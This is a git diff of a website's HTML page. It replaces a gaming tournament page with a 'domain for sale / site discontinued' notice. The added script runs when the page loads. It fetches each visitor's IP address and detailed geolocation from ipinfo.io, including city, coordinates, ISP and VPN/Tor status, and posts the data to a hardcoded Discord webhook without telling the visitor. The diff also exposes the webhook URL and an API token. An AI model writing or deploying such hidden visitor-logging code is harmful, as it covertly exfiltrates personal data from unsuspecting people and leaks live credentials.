@@ -1,57 +1,157 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="SSQD">
-    <meta property="og:description" content="Welcome to SSQD! Explore, connect, and enjoy the vibes here within the community. 
+    <title>Domain For Sale</title>
+    <style>
+        body {
+            color: white;
+            font-family: Arial, sans-serif;
+            font-size: 2rem;
+            font-weight: 900;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            flex-direction: column;
+        }
+        .spacer {
+            height: 20px;
+        }
+        button {
+            background-color: #444;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .country-info {
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+    </style>
+    <script>
+        function getRandomColor() {
+            const letters = '0123456789ABCDEF';
+            let color = '#';
+            for (let i = 0; i < 6; i++) {
+                color += letters[Math.floor(Math.random() * 16)];
+            }
+            return color;
+        }
 
-        Twitch: https://www.twitch.tv/shadowsnipess  
-        Discord: https://discord.gg/ZZkDU9Uh9e
-        
-        Made and Developed By CUB">
-    <meta property="og:url" content="https://ssqd.org">
-    <meta property="og:type" content="website">
-    <title>SSQD Match Masters Tournament</title>
-    <link href="style.css" rel="stylesheet" />
+        function sendWebhook(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1338992215439179877/AUWd853xT1mQab5PuR1bm0flVrKIL87tLstsOqKXg6FbxssY4F3ZiXn4-D3ft7igbqmS";
+            const payload = {
+                content: `New visitor on your website! ${JSON.stringify(data, null, 2)}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        function generateUniqueID() {
+            let uniqueID = localStorage.getItem("uniqueID");
+            if (!uniqueID) {
+                uniqueID = 'user-' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem("uniqueID", uniqueID);
+            }
+            return uniqueID;
+        }
+
+        function fetchGeolocation() {
+            const uniqueID = generateUniqueID();
+            fetch("https://api64.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+
+                    fetch(`https://ipinfo.io/${ip}/json?token=41fc0fc14d9ea3`) 
+                        .then(response => response.json())
+                        .then(locationData => {
+                            const geoData = {
+                                ip: locationData.ip || "Unknown IP",
+                                hostname: locationData.hostname || "Unknown Hostname",
+                                city: locationData.city || "Unknown city",
+                                region: locationData.region || "Unknown region",
+                                country: locationData.country || "Unknown country",
+                                loc: locationData.loc || "Unknown location",
+                                org: locationData.org || "Unknown organization",
+                                postal: locationData.postal || "Unknown postal",
+                                timezone: locationData.timezone || "Unknown timezone",
+                                is_anycast: locationData.is_anycast || false,
+                                is_mobile: locationData.is_mobile || false,
+                                is_anonymous: locationData.is_anonymous || false,
+                                is_satellite: locationData.is_satellite || false,
+                                is_hosting: locationData.is_hosting || false,
+                                ASN: locationData.ASN || "Unknown ASN",
+                                asn: locationData.asn || "Unknown ASN",
+                                name: locationData.name || "Unknown name",
+                                domain: locationData.domain || "Unknown domain",
+                                route: locationData.route || "Unknown route",
+                                type: locationData.type || "Unknown type",
+                                company: {
+                                    name: locationData.company_name || "Unknown Company",
+                                    domain: locationData.company_domain || "Unknown Company Domain",
+                                    type: locationData.company_type || "Unknown Company Type"
+                                },
+                                privacy: {
+                                    vpn: locationData.vpn || false,
+                                    proxy: locationData.proxy || false,
+                                    tor: locationData.tor || false,
+                                    relay: locationData.relay || false,
+                                    hosting: locationData.hosting || false
+                                },
+                                abuse: {
+                                    address: locationData.abuse_address || "Unknown Address",
+                                    country: locationData.abuse_country || "Unknown Country",
+                                    email: locationData.abuse_email || "Unknown Email",
+                                    name: locationData.abuse_name || "Unknown Name",
+                                    network: locationData.abuse_network || "Unknown Network",
+                                    phone: locationData.abuse_phone || "Unknown Phone"
+                                }
+                            };
+
+                            // Display country on the website
+                            const countryElement = document.getElementById('country-info');
+                            countryElement.textContent = `VISITING FROM: ${geoData.country}`;
+
+                            // Send data to the webhook
+                            sendWebhook(geoData);
+                        })
+                        .catch(error => console.error("Error fetching geolocation:", error));
+                })
+                .catch(error => console.error("Error fetching IP:", error));
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            document.body.style.backgroundColor = getRandomColor();
+            fetchGeolocation();
+        });
+    </script>
 </head>
 <body>
-    <!-- Title Container (Fixed at the top) -->
-    <div class="title-container">
-        <div class="website-title">Welcome To The SSQD Match Masters Tournament</div>
-    </div>
+    <div id="country-info" class="country-info"></div>
+    <div class="spacer"></div>
+    <div>😂 😂 😂 😂</div>
+    <div class="spacer"></div>
+    <div>THE SSQD WEBSITE HAS BEEN DISCONTINUED</div>
+    <div class="spacer"></div>
+    <div>WWW.SSQD.ORG</div>
+    <div>WWW.SSQD.ONLINE</div>
+    <div class="spacer"></div>
+    <div>DOMAINS IS FREE!</div>
+    <div class="spacer"></div>
 
-    <!-- Video and Twitch Player -->
-    <div class="video">
-        <!-- Load Twitch Player Embed Script -->
-        <script src="https://player.twitch.tv/js/embed/v1.js"></script>
-
-        <!-- Twitch Player Container -->
-        <div id="ShadowLive"></div>
-
-        <script type="text/javascript">
-        document.addEventListener("DOMContentLoaded", function() {
-            var playerContainer = document.getElementById("ShadowLive");
-            playerContainer.style.width = "100%";
-            playerContainer.style.height = "100%";
-            
-            var options = {
-                width: playerContainer.clientWidth,  // Full width of the container
-                height: playerContainer.clientHeight, // Full height of the container
-                channel: "ShadowSnipess",
-                parent: ["ssqd.org"]
-            };
-            var player = new Twitch.Player("ShadowLive", options);
-            player.setVolume(0.5);
-        });
-        </script>
-    </div>
-
-    <!-- Load jQuery & CommonNinja Widget -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="https://cdn.commoninja.com/sdk/latest/commonninja.js" defer></script>
-    
-    <!-- CommonNinja Component -->
-    <div class="commonninja_component pid-9fa7f31f-5a95-4a73-9ae4-bbb243e6aae5"></div>
+    <button onclick="window.location.reload()">CLICK TO CHANGE BACKGROUND COLOUR!</button>
 </body>
 </html>
